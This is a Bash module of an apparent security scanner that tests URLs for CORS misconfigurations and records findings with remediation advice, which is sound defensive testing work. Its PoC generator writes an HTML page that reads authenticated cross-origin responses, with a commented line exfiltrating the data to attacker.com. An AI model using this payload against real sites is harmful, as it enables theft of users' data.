#!/bin/bash

# CORS (Cross-Origin Resource Sharing) Testing Module
# Tests for CORS misconfigurations

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main CORS testing function
test_cors() {
    local url=$1
    local project_id=$2

    log_info "Testing CORS misconfigurations on $url"

    # Test for overly permissive CORS
    test_cors_wildcard "$url" "$project_id"

    # Test for origin reflection
    test_cors_reflection "$url" "$project_id"

    # Test for null origin
    test_cors_null_origin "$url" "$project_id"

    # Test for credentials with wildcard
    test_cors_credentials "$url" "$project_id"

    # Test for subdomain trust
    test_cors_subdomain_trust "$url" "$project_id"
}

# Test for wildcard (*) CORS policy
test_cors_wildcard() {
    local url=$1
    local project_id=$2

    log_info "[CORS] Testing for wildcard Access-Control-Allow-Origin"

    # Send request without Origin header first
    local response=$(curl -s -I -L "$url" 2>/dev/null)

    # Check for wildcard CORS
    if echo "$response" | grep -qi "Access-Control-Allow-Origin: \*"; then
        log_warn "[CORS] Wildcard CORS policy detected"

        # Check if credentials are allowed
        local allows_credentials=false
        if echo "$response" | grep -qi "Access-Control-Allow-Credentials: true"; then
            allows_credentials=true
            log_critical "[CORS] CRITICAL: Wildcard origin with credentials!"

            db_add_finding "$project_id" "critical" "cors_wildcard_credentials" \
                "CORS Misconfiguration - Wildcard with Credentials" \
                "URL: $url\n\nThe application uses:\n- Access-Control-Allow-Origin: *\n- Access-Control-Allow-Credentials: true\n\nThis combination is invalid and dangerous. It allows any origin to access resources with credentials." \
                "CWE-942" "8.1" \
                "CRITICAL:\n1. Never use wildcard (*) with credentials\n2. Use specific origin whitelist\n3. Validate Origin header server-side\n4. Remove Access-Control-Allow-Credentials if not needed\n5. Implement proper origin validation"

            save_cors_evidence "$project_id" "$url" "Wildcard with Credentials" "$response"
            return 0
        else
            db_add_finding "$project_id" "medium" "cors_wildcard" \
                "CORS Misconfiguration - Overly Permissive Wildcard" \
                "URL: $url\n\nAccess-Control-Allow-Origin: *\n\nWhile not immediately exploitable without credentials, this configuration allows any origin to read responses, which may expose sensitive information." \
                "CWE-942" "5.3" \
                "1. Use specific origin whitelist instead of wildcard\n2. Validate Origin header\n3. Only use wildcard for truly public resources\n4. Consider if CORS is necessary"

            save_cors_evidence "$project_id" "$url" "Wildcard" "$response"
            return 0
        fi
    fi

    return 1
}

# Test for origin reflection vulnerability
test_cors_reflection() {
    local url=$1
    local project_id=$2

    log_info "[CORS] Testing for origin reflection"

    # Test origins
    local test_origins=(
        "https://evil-attacker.com"
        "https://malicious.example.com"
        "http://attacker.com"
        "null"
    )

    for origin in "${test_origins[@]}"; do
        log_debug "[CORS] Testing origin: $origin"

        local response=$(curl -s -I -L \
                         -H "Origin: $origin" \
                         "$url" 2>/dev/null)

        # Check if origin is reflected
        if echo "$response" | grep -q "Access-Control-Allow-Origin: $origin"; then
            log_critical "[CORS] Origin reflection detected! Origin '$origin' is reflected"

            # Check if credentials are allowed
            local has_credentials=false
            if echo "$response" | grep -qi "Access-Control-Allow-Credentials: true"; then
                has_credentials=true
            fi

            local severity="high"
            local description="URL: $url\nTest Origin: $origin\n\nThe application reflects the Origin header without proper validation.\n\n"

            if [ "$has_credentials" = true ]; then
                severity="critical"
                description="${description}Access-Control-Allow-Credentials: true\n\nThis allows any attacker-controlled origin to access authenticated resources!"
            else
                description="${description}While credentials are not explicitly allowed, this misconfiguration may still expose sensitive data."
            fi

            db_add_finding "$project_id" "$severity" "cors_origin_reflection" \
                "CORS Misconfiguration - Origin Reflection" \
                "$description" \
                "CWE-942" "8.8" \
                "CRITICAL:\n1. Implement strict origin whitelist\n2. Never reflect Origin header without validation\n3. Use exact string matching for allowed origins\n4. Avoid regex-based validation (prone to bypass)\n5. Example secure implementation:\n   allowed_origins = ['https://trusted.com', 'https://app.trusted.com']\n   if origin in allowed_origins:\n       send_header('Access-Control-Allow-Origin', origin)"

            save_cors_evidence "$project_id" "$url" "Origin Reflection: $origin" "$response"

            # Generate PoC
            generate_cors_poc "$project_id" "$url" "$origin" "$has_credentials"

            return 0
        fi
    done

    return 1
}

# Test for null origin acceptance
test_cors_null_origin() {
    local url=$1
    local project_id=$2

    log_info "[CORS] Testing for null origin acceptance"

    local response=$(curl -s -I -L \
                     -H "Origin: null" \
                     "$url" 2>/dev/null)

    if echo "$response" | grep -q "Access-Control-Allow-Origin: null"; then
        log_warn "[CORS] Null origin accepted!"

        local has_credentials=false
        if echo "$response" | grep -qi "Access-Control-Allow-Credentials: true"; then
            has_credentials=true
        fi

        local severity="medium"
        [ "$has_credentials" = true ] && severity="high"

        db_add_finding "$project_id" "$severity" "cors_null_origin" \
            "CORS Misconfiguration - Null Origin Accepted" \
            "URL: $url\n\nThe application accepts Origin: null\n\nCredentials allowed: $has_credentials\n\nThe null origin can be triggered via:\n- Sandboxed iframes\n- Redirects from data: URIs\n- File protocol (file://)\n- Cross-origin redirects\n\nAn attacker can exploit this to bypass CORS protections." \
            "CWE-942" "6.5" \
            "1. Reject 'null' origin explicitly\n2. Never whitelist null origin\n3. Validate Origin header properly\n4. Use specific origin whitelist"

        save_cors_evidence "$project_id" "$url" "Null Origin" "$response"
        generate_cors_poc "$project_id" "$url" "null" "$has_credentials"

        return 0
    fi

    return 1
}

# Test credentials configuration
test_cors_credentials() {
    local url=$1
    local project_id=$2

    log_info "[CORS] Testing credentials configuration"

    # Get domain from URL
    local domain=$(echo "$url" | grep -oP 'https?://\K[^/]+')

    local response=$(curl -s -I -L \
                     -H "Origin: https://${domain}" \
                     "$url" 2>/dev/null)

    # Check headers
    local has_allow_origin=$(echo "$response" | grep -qi "Access-Control-Allow-Origin" && echo "yes" || echo "no")
    local has_credentials=$(echo "$response" | grep -qi "Access-Control-Allow-Credentials: true" && echo "yes" || echo "no")
    local has_vary=$(echo "$response" | grep -qi "Vary:.*Origin" && echo "yes" || echo "no")

    if [ "$has_credentials" = "yes" ] && [ "$has_vary" = "no" ]; then
        log_warn "[CORS] Missing Vary: Origin header with credentials"

        db_add_finding "$project_id" "low" "cors_missing_vary" \
            "CORS Misconfiguration - Missing Vary Header" \
            "URL: $url\n\nAccess-Control-Allow-Credentials is set but Vary: Origin header is missing.\n\nThis can cause caching issues where one user's CORS response is cached and served to another user, potentially exposing data or breaking functionality." \
            "CWE-942" "3.7" \
            "1. Add 'Vary: Origin' header when using CORS\n2. This prevents caching issues with CDNs and proxies\n3. Example: Vary: Origin, Accept-Encoding"

        save_cors_evidence "$project_id" "$url" "Missing Vary Header" "$response"
    fi
}

# Test subdomain trust issues
test_cors_subdomain_trust() {
    local url=$1
    local project_id=$2

    log_info "[CORS] Testing subdomain trust patterns"

    # Extract domain
    local domain=$(echo "$url" | grep -oP 'https?://\K[^/]+')
    local base_domain=$(echo "$domain" | rev | cut -d. -f1,2 | rev)

    # Test various subdomain patterns
    local test_subdomains=(
        "evil.${base_domain}"
        "attacker.${base_domain}"
        "test.${base_domain}"
        "${domain}.evil.com"
        "${domain}evil.com"
        "evil${domain}"
    )

    for subdomain in "${test_subdomains[@]}"; do
        local response=$(curl -s -I -L \
                         -H "Origin: https://${subdomain}" \
                         "$url" 2>/dev/null)

        if echo "$response" | grep -q "Access-Control-Allow-Origin:.*${subdomain}"; then
            log_warn "[CORS] Subdomain pattern vulnerability: $subdomain"

            db_add_finding "$project_id" "medium" "cors_subdomain_trust" \
                "CORS Misconfiguration - Overly Permissive Subdomain Trust" \
                "URL: $url\nAccepted Origin: https://${subdomain}\n\nThe application accepts origins based on loose subdomain matching.\n\nIf an attacker can register a subdomain or exploit subdomain takeover, they can bypass CORS protections." \
                "CWE-942" "6.1" \
                "1. Use exact origin matching, not regex patterns\n2. Maintain explicit whitelist of allowed origins\n3. Don't trust all subdomains by default\n4. Monitor for subdomain takeovers\n5. Use Content Security Policy as additional protection"

            save_cors_evidence "$project_id" "$url" "Subdomain Trust: $subdomain" "$response"
            return 0
        fi
    done

    return 1
}

# Generate CORS exploitation PoC
generate_cors_poc() {
    local project_id=$1
    local url=$2
    local origin=$3
    local has_credentials=$4

    local poc_dir="data/projects/${project_id}/evidence/cors"
    mkdir -p "$poc_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local poc_file="${poc_dir}/cors_poc_${timestamp}.html"

    local credentials_attr=""
    [ "$has_credentials" = true ] && credentials_attr='credentials: "include",'

    cat > "$poc_file" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation PoC</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .warning { background: #ffebee; border-left: 4px solid #f44336; padding: 16px; margin: 20px 0; }
        .info { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 16px; margin: 20px 0; }
        pre { background: #f5f5f5; padding: 16px; overflow-x: auto; }
        code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>CORS Vulnerability - Proof of Concept</h1>

    <div class="warning">
        <strong>⚠️ Warning:</strong> This is a proof-of-concept for a CORS vulnerability.
        Only use this for authorized security testing.
    </div>

    <div class="info">
        <strong>Target URL:</strong> <code>$url</code><br>
        <strong>Malicious Origin:</strong> <code>$origin</code><br>
        <strong>Credentials Included:</strong> $has_credentials
    </div>

    <h2>Attack Scenario</h2>
    <p>
        An attacker can host this page on <code>$origin</code> and trick a victim into visiting it.
        The JavaScript will make a cross-origin request to the vulnerable endpoint and read the response.
    </p>

    <h2>Exploitation</h2>
    <button onclick="exploit()">Trigger CORS Exploit</button>
    <pre id="result">Click the button to test...</pre>

    <script>
        function exploit() {
            const resultEl = document.getElementById('result');
            resultEl.textContent = 'Sending request...';

            fetch('$url', {
                method: 'GET',
                $credentials_attr
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => response.text())
            .then(data => {
                resultEl.textContent = 'SUCCESS! Retrieved data from cross-origin:\\n\\n' + data.substring(0, 500);
                console.log('Full response:', data);

                // In real attack, exfiltrate to attacker server:
                // fetch('https://attacker.com/exfil', { method: 'POST', body: data });
            })
            .catch(error => {
                resultEl.textContent = 'Error: ' + error.message;
            });
        }

        // Auto-trigger for demonstration (comment out in production PoC)
        // setTimeout(exploit, 2000);
    </script>

    <h2>Remediation</h2>
    <div class="info">
        <h3>Fix this vulnerability:</h3>
        <ol>
            <li>Implement strict origin whitelist validation</li>
            <li>Never reflect the Origin header without validation</li>
            <li>Don't use wildcard (*) with credentials</li>
            <li>Add <code>Vary: Origin</code> header</li>
            <li>Use exact string matching for allowed origins</li>
        </ol>
        <h3>Example secure implementation (Python Flask):</h3>
        <pre>
ALLOWED_ORIGINS = [
    'https://trusted.com',
    'https://app.trusted.com'
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Vary'] = 'Origin'
    return response
        </pre>
    </div>

    <p><em>Generated by LeKnight Security Scanner - $(date)</em></p>
</body>
</html>
EOF

    log_success "[CORS] PoC generated: $poc_file"
}

# Helper: Save CORS evidence
save_cors_evidence() {
    local project_id=$1
    local url=$2
    local test_type=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/cors"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/cors_${timestamp}.txt" <<EOF
CORS Evidence
URL: $url
Test Type: $test_type
Captured: $(date)

Headers:
$response
EOF
    log_debug "[CORS] Evidence saved"
}

# Export functions
export -f test_cors
export -f test_cors_wildcard
export -f test_cors_reflection
export -f test_cors_null_origin
export -f test_cors_credentials
export -f test_cors_subdomain_trust
